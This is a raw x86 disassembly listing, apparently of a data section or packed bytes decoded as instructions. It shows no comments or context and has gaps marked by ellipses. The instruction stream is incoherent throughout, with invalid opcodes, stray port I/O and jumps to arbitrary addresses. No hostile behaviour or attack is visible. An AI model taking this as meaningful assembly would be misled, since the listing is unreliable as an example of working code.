  41a704:	inc    edx
  41a705:	push   esi
  41a706:	ror    DWORD PTR [esi+0x12867152],1
  41a70c:	sub    BYTE PTR [edi+0x6ce99d3d],dh
  41a712:	rol    BYTE PTR [esi+0x18],0x8d
  41a716:	add    al,0x1b
  41a718:	mov    esp,0x14b94a9e
  41a71d:	xor    ah,BYTE PTR [esi]
  41a71f:	loope  0x41a757
  41a721:	dec    eax
  41a722:	ja     0x41a6fc
  41a724:	xchg   ebx,ecx
  41a726:	xchg   BYTE PTR [edi+0x5d860b33],dl
  41a72c:	les    esp,FWORD PTR [ebx]
  41a72e:	mov    DWORD PTR [ebx+0x6c],ecx
  41a731:	jmp    0x41a797
  41a733:	pusha  
  41a734:	sbb    ch,ah
  41a736:	mov    ds:0xeb5f4f30,eax
  41a73b:	addr16 es jb 0x41a765
  41a73f:	sbb    ch,BYTE PTR [eax]
  41a741:	lods   al,BYTE PTR ds:[esi]
  41a742:	loop   0x41a751
  41a744:	fdivr  st,st(1)
  41a746:	sbb    eax,0xb1e049c8
  41a74b:	loopne 0x41a7a8
  41a74d:	push   ecx
  41a74e:	and    ecx,ecx
  41a750:	inc    eax
  41a751:	push   edx
  41a752:	xlat   BYTE PTR ds:[ebx]
  41a753:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a754:	dec    edx
  41a755:	out    dx,eax
  41a756:	retf   0x29d4
  41a759:	mov    ds:0x8dd8c8bc,eax
  41a75e:	sub    cl,0x5d
  41a761:	xor    bh,0x6b
  41a764:	cmp    DWORD PTR [ecx-0x2],esp
  41a767:	aaa    
  41a768:	hlt    
  41a769:	rol    ebx,1
  41a76b:	lea    edi,[ebp+ebp*1+0x58ef77d3]
  41a772:	jns    0x41a740
  41a774:	outs   dx,DWORD PTR ds:[esi]
  41a775:	jo     0x41a772
  41a777:	shl    DWORD PTR [ebp+edi*8-0x61],0x2c
  41a77c:	(bad)  [edi-0x40dc8d98]
  41a782:	mov    fs,eax
  41a784:	fidiv  WORD PTR [ecx+0x5b]
  41a788:	mov    dh,ah
  41a78a:	dec    ecx
  41a78b:	ss mov dl,0x4a
  41a78e:	push   esi
  41a78f:	jle    0x41a743
  41a791:	clc    
  41a792:	sbb    cl,0x10
  41a795:	pop    esp
  41a796:	or     dh,BYTE PTR [eax]
  41a798:	pushf  
  41a799:	xchg   edi,eax
  41a79a:	call   0xb7b209bf
  41a79f:	out    dx,al
  41a7a0:	inc    esi
  41a7a1:	pop    ss
  41a7a2:	and    dl,ah
  41a7a4:	xchg   ebp,eax
  41a7a5:	pusha  
  41a7a6:	ret    
  41a7a7:	adc    cl,0xef
  41a7aa:	add    ch,cl
  41a7ac:	dec    ebx
  41a7ad:	shr    BYTE PTR [ebx+0x6a],0x9a
  41a7b1:	sbb    DWORD PTR [ecx+0xb88f5c8],ecx
  41a7b7:	jmp    0x41a786
  41a7b9:	ja     0x41a75b
  41a7bb:	inc    ecx
  41a7bc:	pop    esi
  41a7bd:	fcomp  QWORD PTR [esi+esi*1+0x99]
	...
  41a834:	sbb    BYTE PTR [ecx],0x47
  41a837:	loope  0x41a818
  41a839:	jmp    DWORD PTR [esi-0xf626c85]
  41a83f:	loop   0x41a7d9
  41a841:	and    dx,di
  41a844:	clc    
  41a845:	push   ds
  41a846:	add    DWORD PTR [eax],eax
  41a848:	cmc    
  41a849:	add    BYTE PTR [eax],al
  41a84b:	add    BYTE PTR [edi+esi*1-0x7],ah
  41a84f:	out    0x41,eax
  41a851:	cmc    
  41a852:	stos   DWORD PTR es:[edi],eax
  41a853:	inc    eax
  41a854:	out    dx,eax
  41a855:	jle    0x41a891
  41a857:	sbb    ch,0x6
  41a85a:	mov    eax,0xcd979b9a
  41a85f:	jmp    0x41a83f
  41a861:	bound  esi,QWORD PTR [eax-0x2c]
  41a864:	jae    0x41a84c
  41a866:	xchg   edx,eax
  41a867:	push   edx
  41a868:	fld    DWORD PTR [ebp-0x6ae2fc0e]
  41a86e:	xor    BYTE PTR [esi+0x1f],al
  41a871:	mov    ebx,ebp
  41a873:	fistp  QWORD PTR ds:0xa034230
  41a879:	push   ebp
  41a87a:	retf   0x29a5
  41a87d:	cli    
  41a87e:	test   BYTE PTR [edi+ecx*2+0x20],bl
  41a882:	fst    DWORD PTR [ebp-0x1a]
  41a885:	jmp    0xafc8:0x8b767b04
  41a88c:	mov    ds:0x259b25f5,eax
  41a891:	xchg   BYTE PTR [ebx],ch
  41a893:	sub    edi,DWORD PTR [eax+0x2]
  41a896:	sbb    al,0x7e
  41a898:	pop    ss
  41a899:	jecxz  0x41a919
  41a89b:	imul   ebx,DWORD PTR [ebx],0x41
  41a89e:	jmp    0x41a870
  41a8a0:	or     eax,0x78b2dfdc
  41a8a5:	jae    0x41a838
  41a8a7:	push   ss
  41a8a8:	sub    dl,BYTE PTR [edx+0x13]
  41a8ab:	inc    ecx
  41a8ac:	adc    eax,0x68f2d040
  41a8b1:	gs jno 0x41a929
  41a8b4:	push   eax
  41a8b5:	clc    
  41a8b6:	cmp    BYTE PTR [esi+0x2c],dl
  41a8b9:	cs jp  0x41a890
  41a8bc:	ficomp WORD PTR [esi]
  41a8be:	mov    ch,BYTE PTR [eax+0x41]
  41a8c1:	sub    al,cl
  41a8c3:	adc    esi,DWORD PTR [ebx]
  41a8c5:	pop    edi
  41a8c6:	add    eax,0x2f
  41a8c9:	dec    ebx
  41a8ca:	jno    0x41a882
  41a8cc:	push   ss
  41a8cd:	stos   BYTE PTR es:[edi],al
  41a8ce:	xor    ecx,edx
  41a8d0:	pop    edx
  41a8d1:	popf   
  41a8d2:	rcl    BYTE PTR [ecx+0x57],1
  41a8d5:	adc    cl,BYTE PTR [eax+0x46175731]
  41a8db:	retf   0x337e
  41a8de:	add    BYTE PTR [ebx+0x2c15cb30],dh
  41a8e4:	sub    eax,0x8742615f
  41a8e9:	in     eax,0xd6
  41a8eb:	mov    bl,0x4e
  41a8ed:	call   0xabfe:0x2ce893df
  41a8f4:	mov    esi,0x501e394d
  41a8f9:	shl    BYTE PTR [eax-0x60],1
  41a8fc:	repz jae 0x41a8b9
  41a8ff:	mov    ebp,0x645002e8
  41a904:	fist   WORD PTR [edx+0xaf9d0b5]
  41a90a:	mov    eax,0x6abe0f3d
  41a90f:	sahf   
  41a910:	or     edx,DWORD PTR [edi+0x17]
  41a913:	aad    0xa7
  41a915:	fistp  WORD PTR [ebx-0x2ddbc8c7]
  41a91b:	loop   0x41a96c
  41a91d:	push   eax
  41a91e:	call   0x5c63:0x530f3a4e
  41a925:	push   es
  41a926:	add    al,0xf4
  41a928:	sti    
  41a929:	xor    al,0x50
  41a92b:	sub    edi,DWORD PTR [ecx+0x797ea234]
  41a931:	dec    ebx
  41a932:	je     0x41a8f1
  41a934:	aam    0x8b
  41a936:	imul   eax,DWORD PTR [edi+0xa],0x7a368c58
  41a93d:	push   ebp
  41a93e:	add    bl,ah
  41a940:	icebp  
	...
  41a9b1:	add    BYTE PTR [eax],al
  41a9b3:	add    BYTE PTR [ebx],dh
  41a9b5:	xor    DWORD PTR [ebx+0x77e793c5],edx
  41a9bb:	idiv   DWORD PTR [ecx+0x289e3df1]
  41a9c1:	aam    0x4b
  41a9c3:	mov    ch,ch
  41a9c5:	pop    ds
  41a9c6:	add    DWORD PTR [eax],eax
  41a9c8:	cmc    
  41a9c9:	add    BYTE PTR [eax],al
  41a9cb:	add    BYTE PTR [eax+ebp*8-0x67],bh
  41a9cf:	mov    edi,0xcbc8f305
  41a9d4:	mov    ah,0x59
  41a9d6:	xchg   ebp,eax
  41a9d7:	jmp    0x41a960
  41a9d9:	mov    ds,ebx
  41a9db:	lea    ebp,[ecx]
  41a9dd:	pop    es
  41a9de:	xor    BYTE PTR [esi],cl
  41a9e0:	and    bl,bl
  41a9e2:	pop    DWORD PTR [esi]
  41a9e4:	or     al,0xe6
  41a9e6:	mov    al,ds:0x329a0c94
  41a9eb:	cli    
  41a9ec:	call   0x564083c7
  41a9f1:	pop    ebx
  41a9f2:	mov    dl,0xb7
  41a9f4:	xor    ebx,esp
  41a9f6:	pop    ds
  41a9f7:	fidiv  DWORD PTR [edx]
  41a9f9:	fwait
  41a9fa:	mov    bh,0x22
  41a9fc:	retf   
  41a9fd:	sub    dl,BYTE PTR ds:0x8e40a59a
  41aa03:	rcr    DWORD PTR [ebp+0xe13352a],cl
  41aa09:	int    0x9f
  41aa0b:	cmp    BYTE PTR [ebx-0x8],dl
  41aa0e:	call   0x7219:0xb48b20dd
  41aa15:	xchg   esi,eax
  41aa16:	jns    0x41aa4d
  41aa18:	in     al,dx
  41aa19:	and    al,0x82
  41aa1b:	scas   al,BYTE PTR es:[edi]
  41aa1c:	pop    eax
  41aa1d:	inc    eax
  41aa1e:	out    0x45,eax
  41aa20:	(bad)  
  41aa21:	iret   
  41aa22:	jle    0x41aa7d
  41aa24:	scas   al,BYTE PTR es:[edi]
  41aa25:	xchg   ebx,eax
  41aa26:	int    0x4a
  41aa28:	fst    st(1)
  41aa2a:	push   eax
  41aa2b:	repnz enter 0x2d74,0x92
  41aa30:	iret   
  41aa31:	scas   eax,DWORD PTR es:[edi]
  41aa32:	gs cmp ebx,ebp
  41aa35:	adc    ebx,DWORD PTR [ebx+0x16a355cb]
  41aa3b:	mov    al,ds:0x70aa094
  41aa40:	lahf   
  41aa41:	ds add dh,cl
  41aa44:	into   
  41aa45:	pushf  
  41aa46:	mov    ebx,DWORD PTR [eax]
  41aa48:	jno    0x41aa26
  41aa4a:	test   eax,0xe71afab6
  41aa4f:	rcr    DWORD PTR [ecx],0x3d
  41aa52:	xor    eax,0xa68715f2
  41aa57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aa58:	lock fisubr DWORD PTR [edx-0x27]
  41aa5c:	lods   eax,DWORD PTR ds:[esi]
  41aa5d:	push   edi
  41aa5e:	jg     0x41aaab
  41aa60:	or     BYTE PTR [ecx+0x58],ch
  41aa63:	push   esi
  41aa64:	(bad)  
  41aa65:	fadd   st,st(4)
  41aa67:	and    dh,BYTE PTR [eax]
  41aa69:	mov    WORD PTR [eax+0x47],fs
  41aa6c:	mov    bl,0xd4
  41aa6e:	jmp    0x41aaa4
  41aa70:	or     al,0x43
  41aa72:	es stos BYTE PTR es:[edi],al
  41aa74:	ss mov dh,0x16
  41aa77:	in     al,0xec
  41aa79:	ss mov ah,0xde
  41aa7c:	cmp    dl,BYTE PTR [ecx]
  41aa7e:	push   esp
  41aa7f:	xchg   ecx,eax
  41aa80:	div    DWORD PTR es:[edx]
  41aa83:	jb     0x41aab8
  41aa85:	push   ds
  41aa86:	jne    0x41aa94
  41aa88:	mov    dh,0x4a
  41aa8a:	sbb    ebx,ebp
  41aa8c:	xor    BYTE PTR [edx+0x4d0fb249],ah
  41aa92:	sahf   
  41aa93:	enter  0xf8b7,0xed
  41aa97:	retf   0xe437
  41aa9a:	out    dx,eax
  41aa9b:	in     eax,0xb1
  41aa9d:	addr16 adc eax,0xc564a2d1
  41aaa3:	aad    0x97
  41aaa5:	retf   0x3945
  41aaa8:	push   esi
  41aaa9:	pop    ds
  41aaaa:	jne    0x41aa33
  41aaac:	adc    ebp,0x38
  41aaaf:	jo     0x41ab0b
  41aab1:	push   cs
  41aab2:	sbb    al,0x9e
  41aab4:	in     al,0xbf
  41aab6:	call   0x40bf7b1f
  41aabb:	loop   0x41ab07
  41aabd:	das    
  41aabe:	adc    cl,BYTE PTR [edi]
  41aac0:	add    DWORD PTR [eax],0x0
	...
  41ab32:	add    BYTE PTR [eax],al
  41ab34:	dec    edx
  41ab35:	(bad)  
  41ab36:	cli    
  41ab37:	inc    edi
  41ab38:	(bad)  
  41ab39:	jg     0x41ab3a
  41ab3b:	int    0x91
  41ab3d:	pop    es
  41ab3e:	sbb    ecx,DWORD PTR [edi-0x17]
  41ab41:	hlt    
  41ab42:	fisubr WORD PTR [edi]
  41ab44:	loop   0x41ab66
  41ab46:	add    DWORD PTR [eax],eax
  41ab48:	cmc    
  41ab49:	add    BYTE PTR [eax],al
  41ab4b:	add    BYTE PTR ds:0xb4b274c9,dl
  41ab51:	lods   al,BYTE PTR ds:[esi]
  41ab52:	xchg   edi,eax
  41ab53:	or     dh,BYTE PTR [esi+0x2e9908d6]
  41ab59:	mov    bh,0xb6
  41ab5b:	enter  0x26e2,0xb5
  41ab5f:	std    
  41ab60:	repz mov ch,0xc1
  41ab63:	(bad)  
  41ab65:	cmp    al,0x2
  41ab67:	jecxz  0x41aaf2
  41ab69:	fldenv [ecx+0x55b5b21d]
  41ab6f:	retf   
  41ab70:	(bad)  
  41ab71:	jecxz  0x41ab58
  41ab73:	test   BYTE PTR ds:0x3e54a60d,0xa3
  41ab7a:	push   cs
  41ab7b:	xor    DWORD PTR [edx],edi
  41ab7d:	push   cs
  41ab7e:	add    DWORD PTR [ecx],esp
  41ab80:	clc    
  41ab81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ab82:	cdq    
  41ab83:	fisub  DWORD PTR [eax+ecx*8-0x76]
  41ab87:	dec    ebp
  41ab88:	or     eax,0xa953afd7
  41ab8d:	sbb    DWORD PTR [esi],esi
  41ab8f:	shl    DWORD PTR [edi-0x13],0x6b
  41ab93:	dec    edx
  41ab94:	inc    edx
  41ab95:	push   cs
  41ab96:	xor    DWORD PTR [eax+0x7263cddb],edx
  41ab9c:	or     DWORD PTR [esi+0x398e7c73],esp
  41aba2:	std    
  41aba3:	lahf   
  41aba4:	jg     0x41ab68
  41aba6:	inc    edi
  41aba7:	sar    BYTE PTR [ebx+eiz*2-0x160e5da1],1
  41abae:	sub    BYTE PTR gs:[ecx-0x304b1be4],dl
  41abb5:	icebp  
  41abb6:	fdiv   st(4),st
  41abb8:	xor    bl,BYTE PTR [ebp-0x21]
  41abbb:	or     ebx,DWORD PTR [ebp+0x2]
  41abbe:	push   edx
  41abbf:	push   cs
  41abc0:	(bad)  
  41abc1:	mov    bh,0xa6
  41abc3:	outs   dx,DWORD PTR ds:[esi]
  41abc4:	loope  0x41abdc
  41abc6:	imul   eax,DWORD PTR [esi],0x2
  41abc9:	mov    esp,edi
  41abcb:	inc    ebp
  41abcc:	xchg   ebx,eax
  41abcd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41abce:	cdq    
  41abcf:	mov    DWORD PTR [ebx],edi
  41abd1:	sbb    dl,BYTE PTR [esi+0x67eb34b6]
  41abd7:	mov    ch,0xb1
  41abd9:	add    al,0x70
  41abdb:	or     ecx,esi
  41abdd:	mov    ds:0x6dfdfc54,eax
  41abe2:	in     eax,0x14
  41abe4:	lods   eax,DWORD PTR ds:[esi]
  41abe5:	inc    ebp
  41abe6:	aam    0x1c
  41abe8:	and    eax,0xe93473c0
  41abed:	sub    BYTE PTR [ebx-0x7e3ee281],bh
  41abf3:	or     ecx,DWORD PTR [edi+0x75]
  41abf6:	xchg   BYTE PTR [ebp-0xfb934bb],ch
  41abfc:	pop    esi
  41abfd:	sbb    DWORD PTR [esi+eax*4],eax
  41ac00:	mov    dl,0x5a
  41ac02:	xor    DWORD PTR [esp+edi*8+0x7d],esp
  41ac06:	shl    ebx,cl
  41ac08:	or     eax,0x8b63e5c
  41ac0d:	fst    DWORD PTR [ebp+0x44]
  41ac10:	inc    BYTE PTR [eax+0x253083a5]
  41ac16:	out    dx,al
  41ac17:	mov    ?,WORD PTR [edx+0x338245c2]
  41ac1d:	add    BYTE PTR [edx],bh
  41ac1f:	mov    ebx,0x81d63ee5
  41ac24:	retf   0xf63b
  41ac27:	dec    esp
  41ac28:	sbb    edx,DWORD PTR [eax+eax*4+0x7f]
  41ac2c:	xchg   BYTE PTR [esi],ch
  41ac2e:	sahf   
  41ac2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ac30:	(bad)  
  41ac31:	mov    cl,0xf5
  41ac33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ac34:	inc    ebp
  41ac35:	push   esi
  41ac36:	cmp    al,0x67
  41ac38:	adc    al,0x4c
  41ac3b:	add    ecx,edx
  41ac3d:	jb     0x41ac33
  41ac3f:	pop    es
  41ac40:	arpl   WORD PTR [eax],ax
	...
  41acb2:	add    BYTE PTR [eax],al
  41acb4:	lock xchg edi,eax
  41acb6:	std    
  41acb7:	cmp    al,0xff
  41acb9:	jle    0x41acac
  41acbb:	fisttp WORD PTR [esi+0x20]
  41acbe:	cmp    eax,0xbb136902
  41acc3:	xchg   edi,eax
  41acc4:	xlat   BYTE PTR ds:[ebx]
  41acc5:	and    DWORD PTR [ecx],eax
  41acc7:	add    ch,dh
  41acc9:	add    BYTE PTR [eax],al
  41accb:	add    BYTE PTR [ebp-0x35965415],ah
  41acd1:	jl     0x41ac56
  41acd3:	fldenv [esi]
  41acd5:	fmul   QWORD PTR [edx-0x40]
  41acd8:	mov    al,0x60
  41acda:	shl    BYTE PTR [ecx],0xe4
  41acdd:	sub    DWORD PTR [esp+eax*4],0x35a23db3
  41ace4:	or     BYTE PTR [esi-0x70bd5fd0],cl
  41acea:	cs in  eax,0xa6
  41aced:	push   edi
  41acee:	enter  0x68c,0x21
  41acf2:	fsub   DWORD PTR [ecx]
  41acf4:	jbe    0x41ace5
  41acf6:	jmp    DWORD PTR [eax]
  41acf8:	cmp    DWORD PTR [ecx+0x67],ecx
  41acfb:	or     al,0xe4
  41acfd:	ret    0xd314
  41ad00:	mov    al,BYTE PTR [esi+0x3f9e0bcc]
  41ad06:	mov    ecx,0xa7defbcb
  41ad0b:	fldcw  WORD PTR [ecx-0x42]
  41ad0e:	or     eax,0x9942587c
  41ad13:	inc    ebx
  41ad14:	into   
  41ad15:	xlat   BYTE PTR ds:[ebx]
  41ad16:	ds test eax,0xb3a86149
  41ad1c:	inc    esp
  41ad1d:	aas    
  41ad1e:	or     ch,dl
  41ad20:	pop    esi
  41ad21:	out    dx,eax
  41ad22:	call   0x7760f53d
  41ad27:	pop    ecx
  41ad28:	xchg   edi,eax
  41ad29:	add    cl,BYTE PTR ds:0xb8951b8a
  41ad2f:	imul   esp,DWORD PTR [edx-0x781836f6],0x2e
  41ad36:	fxch   st(4)
  41ad38:	das    
  41ad39:	inc    eax
  41ad3a:	outs   dx,DWORD PTR ds:[esi]
  41ad3b:	outs   dx,DWORD PTR ds:[esi]
  41ad3c:	ret    
  41ad3d:	push   ss
  41ad3e:	xlat   BYTE PTR ds:[ebx]
  41ad3f:	ins    BYTE PTR es:[edi],dx
  41ad40:	ja     0x41ad5f
  41ad42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ad43:	push   ds
  41ad44:	sub    al,0xe4
  41ad46:	test   eax,0x46153d8
  41ad4b:	mov    ebp,0x3314db8a
  41ad50:	imul   edi,eax,0x2e
  41ad53:	jecxz  0x41adca
  41ad55:	mov    ecx,0x57833ce
  41ad5a:	in     eax,0x4a
  41ad5c:	push   ecx
  41ad5d:	je     0x41ad66
  41ad5f:	inc    edx
  41ad60:	mov    DWORD PTR [ebp-0x3d1c0947],edx
  41ad66:	pop    ss
  41ad67:	sbb    eax,0xa2aa26ac
  41ad6c:	xchg   ebx,eax
  41ad6d:	in     eax,0xeb
  41ad6f:	or     eax,0xca60a703
  41ad74:	aam    0x49
  41ad76:	sbb    DWORD PTR [ebx-0x32],ecx
  41ad79:	aam    0xa0
  41ad7b:	and    cl,BYTE PTR [esp+edi*4+0x73766c2b]
  41ad82:	xor    eax,0x8a2343b7
  41ad87:	jmp    0x50c4af44
  41ad8c:	gs jbe 0x41adef
  41ad8f:	or     dl,BYTE PTR ds:0x5983b994
  41ad95:	sub    eax,0x9f279b3a
  41ad9a:	es inc edi
  41ad9c:	add    DWORD PTR [edi+0x6c],ebp
  41ad9f:	loopne 0x41ad7f
  41ada1:	aaa    
  41ada2:	test   BYTE PTR [esi+0x2f7608d7],ch
  41ada8:	not    dl
  41adaa:	leave  
  41adab:	pop    ss
  41adac:	pop    edi
  41adad:	shl    esi,1
  41adaf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41adb0:	jb     0x41adba
  41adb2:	in     eax,dx
  41adb3:	push   ss
  41adb4:	xchg   ecx,eax
  41adb5:	gs loopne 0x41ade1
  41adb8:	or     dh,BYTE PTR [ebp+0x3ac51f26]
  41adbe:	ret    0x1aa
	...
  41ae31:	add    BYTE PTR [eax],al
  41ae33:	add    BYTE PTR [edi+0x5fc517d8],al
  41ae39:	iret   
  41ae3a:	xlat   BYTE PTR ds:[ebx]
  41ae3b:	ficom  DWORD PTR [edi+0x4177741d]
  41ae41:	xor    BYTE PTR [esi+0x122cc9e],ah
  41ae47:	add    ch,dh
  41ae49:	add    BYTE PTR [eax],al
  41ae4b:	add    bh,dl
  41ae4d:	cmp    edx,esp
  41ae4f:	fistp  WORD PTR [ebx+0x3a]
  41ae52:	rcr    DWORD PTR [ecx-0x6d],0x8a
  41ae56:	adc    DWORD PTR [esi+0x159cbaae],eax
  41ae5c:	(bad)  
  41ae5d:	nop
  41ae5e:	adc    ch,dl
  41ae60:	jbe    0x41aded
  41ae62:	push   es
  41ae63:	outs   dx,BYTE PTR ds:[esi]
  41ae64:	cmp    eax,0x220348e6
  41ae69:	sti    
  41ae6a:	lea    ebp,[eax-0x1b]
  41ae6d:	mov    ah,BYTE PTR [esi+ebx*4]
  41ae70:	data16 jne 0x41aeef
  41ae73:	pop    ebx
  41ae74:	sti    
  41ae75:	dec    esp
  41ae76:	push   ebp
  41ae77:	les    esi,FWORD PTR ds:0x8220a1e6
  41ae7d:	jne    0x41aea7
  41ae7f:	(bad)  
  41ae80:	xchg   ebp,eax
  41ae81:	adc    al,0x2d
  41ae83:	push   ds
  41ae84:	mov    edx,0x3caf3028
  41ae89:	pop    edi
  41ae8a:	mov    dh,0x86
  41ae8c:	in     al,0x22
  41ae8e:	push   ecx
  41ae8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ae90:	mov    BYTE PTR [ebx-0x1d],dh
  41ae93:	pushf  
  41ae94:	or     BYTE PTR [esi],ch
  41ae96:	or     DWORD PTR [eax+esi*2+0x64d5674c],ebp
  41ae9d:	das    
  41ae9e:	jmp    0x1136846e
  41aea3:	xor    BYTE PTR [ebp-0x3f],ah
  41aea6:	lahf   
  41aea7:	jecxz  0x41aea3
  41aea9:	or     BYTE PTR [edx+0x29],al
  41aeac:	add    dl,bh
  41aeae:	enter  0x7b38,0xb7
  41aeb2:	inc    esi
  41aeb3:	mov    edx,0xb63329fa
  41aeb8:	xor    eax,0x5e10f6b7
  41aebd:	or     eax,0xea0ff880
  41aec2:	mov    eax,ds:0x4be330ad
  41aec7:	sbb    al,0x23
  41aec9:	imul   esp,DWORD PTR ds:[ecx],0x4d
  41aecd:	dec    ebx
  41aece:	sub    ch,BYTE PTR [edx-0x1b]
  41aed1:	dec    ebx
  41aed2:	push   ds
  41aed3:	cmp    esi,0xffffff9e
  41aed6:	leave  
  41aed7:	and    eax,DWORD PTR [esi+ebp*4]
  41aeda:	addr16 in al,0xa
  41aedd:	lods   eax,DWORD PTR ds:[esi]
  41aede:	pop    es
  41aedf:	push   es
  41aee0:	rcl    DWORD PTR [ecx+0xa431e61],1
  41aee6:	retf   
  41aee7:	sub    DWORD PTR [esi+esi*1-0x47],ecx
  41aeeb:	or     ch,ch
  41aeed:	stos   DWORD PTR es:[edi],eax
  41aeee:	mov    eax,ds:0xdc8d1f50
  41aef3:	mul    bh
  41aef5:	pop    edi
  41aef6:	out    dx,al
  41aef7:	shr    BYTE PTR [ebx],1
  41aef9:	repnz fadd st,st(5)
  41aefc:	xor    al,0x88
  41aefe:	hlt    
  41aeff:	aad    0xa6
  41af01:	mov    BYTE PTR ds:0x8f95ccfc,dl
  41af07:	in     al,dx
  41af08:	aam    0xf6
  41af0a:	clc    
  41af0b:	es fwait
  41af0d:	in     al,0x5b
  41af0f:	ficomp DWORD PTR [edi+0x28]
  41af12:	adc    edx,0x66
  41af15:	or     DWORD PTR [esi+ebp*1-0xb65b673],eax
  41af1c:	cmp    bh,BYTE PTR [ebp-0x386279ae]
  41af22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41af23:	out    dx,eax
  41af24:	rcl    DWORD PTR [edi+0x2],0x99
  41af28:	cmc    
  41af29:	add    ah,BYTE PTR [edi-0x7e3c865e]
  41af2f:	pop    ebx
  41af30:	(bad)  
  41af31:	iret   
  41af32:	aad    0xc0
  41af34:	inc    ebx
  41af35:	(bad)  
  41af36:	cdq    
  41af37:	out    0x9,al
  41af39:	pop    edx
  41af3a:	sub    eax,edx
  41af3c:	neg    DWORD PTR [esp+eax*4+0xf18e]
	...
  41afb3:	add    BYTE PTR [esi-0x15],cl
  41afb6:	sub    cl,BYTE PTR [esi-0x51]
  41afb9:	iret   
  41afba:	outs   dx,BYTE PTR ds:[esi]
  41afbb:	jmp    0x41af3d
  41afbd:	rcl    DWORD PTR [esi+0x1d],0x5d
  41afc1:	sub    dh,dl
  41afc3:	lods   al,BYTE PTR ds:[esi]
  41afc4:	shl    DWORD PTR [ebx],0x1
  41afc7:	add    ch,dh
  41afc9:	add    BYTE PTR [eax],al
  41afcb:	add    cl,ch
  41afcd:	lahf   
  41afce:	loop   0x41af6e
  41afd0:	adc    al,0x59
  41afd2:	pop    edi
  41afd3:	adc    esi,ebp
  41afd5:	xor    dl,BYTE PTR [edi-0x54f1aac8]
  41afdb:	add    DWORD PTR [ecx],edi
  41afdd:	lods   eax,DWORD PTR ds:[esi]
  41afde:	(bad)  
  41afdf:	das    
  41afe0:	jno    0x41b040
  41afe2:	dec    ebx
  41afe3:	retf   0xf252
  41afe6:	aam    0x9d
  41afe8:	inc    ebx
  41afe9:	push   eax
  41afea:	pop    edx
  41afeb:	and    DWORD PTR [esi],eax
  41afed:	es ds mov esi,0x8ac7d8cd
  41aff4:	loop   0x41b04d
  41aff6:	jmp    0x5c1a309d
  41affb:	icebp  
  41affc:	mov    cl,BYTE PTR [ebx-0x42f6d668]
  41b002:	scas   al,BYTE PTR es:[edi]
  41b003:	aad    0xc3
  41b005:	cmp    eax,edx
  41b007:	pop    edx
  41b008:	mov    eax,0xa703f86f
  41b00d:	mov    ds:0xfb88afa6,al
  41b012:	fld    TBYTE PTR [ebx-0x8]
  41b015:	add    DWORD PTR [edx],edi
  41b017:	dec    edx
  41b018:	pop    ss
  41b019:	push   cs
  41b01a:	lahf   
  41b01b:	ficomp WORD PTR [ecx+0x46]
  41b01e:	out    dx,eax
  41b01f:	lea    esp,[esi+0x2a]
  41b022:	jmp    0x506bd879
  41b027:	cli    
  41b028:	data16 ja 0x41b055
  41b02b:	mov    WORD PTR [ecx+0x7e],gs
  41b02e:	rol    BYTE PTR [ecx+0x3b3eef92],0xe5
  41b035:	sqrtps xmm2,XMMWORD PTR [ebx]
  41b038:	loope  0x41afc0
  41b03a:	int3   
  41b03b:	mov    al,0x35
  41b03d:	lahf   
  41b03e:	pop    ecx
  41b03f:	ror    BYTE PTR [edi+ebx*2-0x6e],1
  41b043:	xchg   BYTE PTR [esi-0x77816642],dh
  41b049:	into   
  41b04a:	out    dx,al
  41b04b:	stos   DWORD PTR es:[edi],eax
  41b04c:	retf   0xdc7f
  41b04f:	and    eax,0xd16dd362
  41b054:	push   0x15
  41b056:	test   BYTE PTR ds:0x8b153b5,ch
  41b05c:	fsub   DWORD PTR ds:0xbcb2f2ab
  41b062:	outs   dx,BYTE PTR ds:[esi]
  41b063:	jmp    DWORD PTR [ecx]
  41b065:	add    al,dh
  41b067:	test   BYTE PTR [ebx-0x3c36d82a],cl
  41b06d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b06e:	test   eax,0x5c28d21d
  41b073:	(bad)  [ebx+0x688ca650]
  41b079:	add    edx,DWORD PTR [ebp+0x74]
  41b07c:	xchg   ebx,eax
  41b07d:	dec    ebx
  41b07e:	xor    BYTE PTR [edi],bl
  41b080:	xor    ah,BYTE PTR [edx+0x3e]
  41b083:	adc    cl,BYTE PTR [eax-0x6a3023e3]
  41b089:	rcl    BYTE PTR [ecx-0x63],0xff
  41b08d:	and    eax,0x57df485a
  41b092:	lea    esp,[ecx]
  41b094:	stc    
  41b095:	bound  eax,QWORD PTR [edx+0x55]
  41b098:	int    0x30
  41b09a:	pop    esp
  41b09b:	dec    edi
  41b09c:	imul   BYTE PTR ds:0x86d9969b
  41b0a3:	pop    esp
  41b0a4:	or     ch,BYTE PTR [esi-0x40e33068]
  41b0aa:	adc    DWORD PTR [edx-0x5a],ebp
  41b0ad:	cmp    DWORD PTR [ecx],0x69
  41b0b0:	pop    edi
  41b0b1:	pop    ecx
  41b0b2:	out    dx,eax
  41b0b3:	xchg   esi,eax
  41b0b4:	jg     0x41b0e4
  41b0b6:	and    eax,0x61d4c124
  41b0bb:	cwde   
  41b0bc:	mov    bl,0x89
  41b0be:	mov    edx,fs
  41b0c0:	js     0x41b0c2
	...
  41b132:	add    BYTE PTR [eax],al
  41b134:	sbb    al,0xc
  41b136:	std    
  41b137:	sbb    ebp,edi
  41b139:	stc    
  41b13a:	cld    
  41b13b:	or     eax,0x64289710
  41b140:	je     0x41b10d
  41b142:	nop
  41b143:	ja     0x41b0fb
  41b145:	and    al,0x1
  41b147:	add    ch,dh
  41b149:	add    BYTE PTR [eax],al
  41b14b:	add    BYTE PTR [ebx],ch
  41b14d:	inc    eax
  41b14e:	add    BYTE PTR [edi],bh
  41b150:	cmp    bl,BYTE PTR ds:0x54e7659f
  41b156:	sub    dl,0x77
  41b159:	adc    ah,bl
  41b15b:	add    ebp,DWORD PTR [edx+0x5d6fb9ef]
  41b161:	inc    ebx
  41b162:	mov    ?,ebp
  41b164:	test   eax,0x71150407
  41b169:	pop    edi
